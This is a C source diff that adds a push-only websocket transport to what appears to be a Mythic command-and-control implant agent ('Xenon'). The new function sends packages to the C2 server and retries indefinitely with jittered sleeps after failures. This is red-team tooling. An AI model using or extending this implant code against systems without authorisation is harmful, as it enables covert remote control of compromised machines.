@@ -4,6 +4,7 @@
 #include "Config.h"
 #include "TransportHttp.h"
 #include "TransportSmb.h"
+#include "TransportWebsocket.h"
 #include "Parser.h"
 #include "Package.h"
 #include "Strategy.h"
@@ -20,6 +21,14 @@ HANDLE gHttpMutex = NULL;
 BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);
 
 #endif  // HTTPX_TRANSPORT
+
+#ifdef WEBSOCKET_TRANSPORT
+
+int gWsFailureCount = 0;
+
+BOOL NetworkWebsocketSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);
+
+#endif  // WEBSOCKET_TRANSPORT
 
 
 /**
@@ -70,6 +79,19 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
 
         return TRUE;
     #endif
+
+/* Websocket C2 Profile (Push) */
+    #ifdef WEBSOCKET_TRANSPORT
+        BOOL bStatus = FALSE;
+
+        bStatus = NetworkWebsocketSend(package, ppOutData, pOutLen);
+
+        if ( bStatus == FALSE )
+            return FALSE;
+
+        return TRUE;
+    #endif
+
 // Maybe some day
     #ifdef DNS_TRANSPORT
         return TRUE;
@@ -191,6 +213,47 @@ BOOL NetworkTcpSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen, BOOL Is
 
 
 #endif  // TCP_TRANSPORT
+
+#ifdef WEBSOCKET_TRANSPORT
+/**
+ * @brief Transport Mythic using websocket profile (Push-only).
+ * 
+ * @param[in] package Payload to send to Mythic server.
+ * @param[out] ppOutData Unused (replies arrive on receive thread).
+ * @param[out] pOutLen Unused.
+ * 
+ * @return BOOL
+ */
+BOOL NetworkWebsocketSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
+{
+    BOOL bStatus = FALSE;
+
+    if ( ppOutData )
+        *ppOutData = NULL;
+    if ( pOutLen )
+        *pOutLen = 0;
+
+retry_request:
+    /* Send websocket JSON msg (connects if needed) */
+    bStatus = WebsocketSend(package);
+
+    if ( bStatus )
+    {
+        gWsFailureCount = 0;
+    }
+    else
+    {
+        gWsFailureCount++;
+        WebsocketClose();
+        _err("[WS] Send failed %d times. Retrying...", gWsFailureCount);
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+        goto retry_request;
+    }
+
+    return bStatus;
+}
+
+#endif  // WEBSOCKET_TRANSPORT
 
 #ifdef DNS_TRANSPORT
     // good code
